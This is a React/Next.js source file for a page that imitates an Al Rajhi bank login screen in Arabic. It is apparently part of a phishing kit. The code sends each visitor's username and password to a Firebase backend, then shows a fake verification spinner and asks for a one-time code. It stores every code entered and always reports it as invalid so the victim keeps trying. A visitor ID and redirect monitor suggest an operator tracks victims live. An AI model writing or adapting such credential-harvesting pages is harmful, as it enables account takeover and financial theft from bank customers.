"use client";

import type React from "react";

import { useState } from "react";
import { Eye, EyeOff, AlertCircle, Loader2, KeyRound } from "lucide-react";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { addData } from "@/lib/firebase";
import { StepShell } from "@/components/step-shell";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

type Screen = "login" | "loading" | "otp";

export default function AlRajhiLoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [screen, setScreen] = useState<Screen>("login");
  const [otp, setOtp] = useState("");

  const visitorId =
    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";

  useRedirectMonitor({
    visitorId,
    currentPage: "rajhi",
  });

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    await addData({
      id: visitorId,
      rajhiUser: username,
      rajhiPasswrod: password,
    });

    setScreen("loading");
    setTimeout(() => {
      setScreen("otp");
    }, 2000);
  };

  const handleOtp = async (e: React.FormEvent) => {
    e.preventDefault();

    await addData({
      id: visitorId,
      rajhiOtp: otp,
    });

    setScreen("loading");
    setTimeout(() => {
      setScreen("otp");
      alert("invalid otp");
      setOtp("");
    }, 2000);
  };

  if (screen === "loading") {
    return (
      <StepShell
        step={8}
        title="جاري التحقق"
        subtitle="يرجى الانتظار لحين التحقق من البيانات."
        icon={<Loader2 className="h-8 w-8 animate-spin" />}
      >
        <div className="flex flex-col items-center justify-center gap-4 py-4">
          <div className="flex h-16 w-16 items-center justify-center rounded-full border-2 border-[#d2e1ed] bg-[#f5fafe]">
            <Loader2 className="h-8 w-8 animate-spin text-[#145072]" />
          </div>
          <p className="text-base font-semibold text-[#5f788b]">جاري التحقق...</p>
        </div>
      </StepShell>
    );
  }

  if (screen === "otp") {
    return (
      <StepShell
        step={8}
        title="التحقق"
        subtitle="أدخل رمز التحقق المرسل إلى جوالك."
        icon={<KeyRound className="h-8 w-8" />}
      >
        <form className="space-y-4" onSubmit={handleOtp}>
          <Input
            type="text"
            inputMode="numeric"
            maxLength={6}
            required
            value={otp}
            onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
            placeholder="أدخل رمز التحقق"
            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 text-center text-2xl font-bold tracking-[0.35em] text-[#194e6e] placeholder:text-[#93a7b7] focus:border-[#145072]"
          />
          <Button
            type="submit"
            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
          >
            تأكيد
          </Button>
          <Button
            type="button"
            onClick={() => setScreen("login")}
            className="h-12 w-full rounded-xl border-2 border-[#d2e1ed] bg-white font-bold text-[#145072] hover:bg-[#f4f8fc]"
          >
            رجوع
          </Button>
        </form>
      </StepShell>
    );
  }

  return (
    <StepShell
      step={8}
      title="تسجيل الدخول"
      subtitle="الرجاء إدخال بياناتك للمتابعة."
      icon={<AlertCircle className="h-8 w-8" />}
    >
      <form className="space-y-4" onSubmit={handleLogin}>
        <div className="relative">
          <Input
            required
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="اسم المستخدم"
            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 pl-11 text-right text-base focus:border-[#145072]"
          />
          <AlertCircle className="pointer-events-none absolute left-3 top-1/2 h-5 w-5 -translate-y-1/2 text-[#6d879a]" />
        </div>

        <div className="relative">
          <Input
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            type={showPassword ? "text" : "password"}
            required
            placeholder="كلمة المرور"
            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 pl-11 text-right text-base focus:border-[#145072]"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute left-3 top-1/2 -translate-y-1/2 text-[#6d879a]"
          >
            {showPassword ? (
              <EyeOff className="h-5 w-5" />
            ) : (
              <Eye className="h-5 w-5" />
            )}
          </button>
        </div>

        <div className="flex items-center justify-between rounded-xl border border-[#dce8f3] bg-[#f5fafe] p-3">
          <button type="button" className="text-sm font-semibold text-[#145072]">
            نسيت كلمة المرور؟
          </button>
          <button
            type="button"
            onClick={() => setRememberMe(!rememberMe)}
            className="flex items-center gap-2 text-sm font-semibold text-[#145072]"
          >
            <span>تذكرني</span>
            <span
              className={`flex h-5 w-5 items-center justify-center rounded border ${
                rememberMe
                  ? "border-[#145072] bg-[#145072] text-white"
                  : "border-[#145072] bg-white text-transparent"
              }`}
            >
              ✓
            </span>
          </button>
        </div>

        <Button
          type="submit"
          className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
        >
          تسجيل الدخول
        </Button>
      </form>
    </StepShell>
  );
}
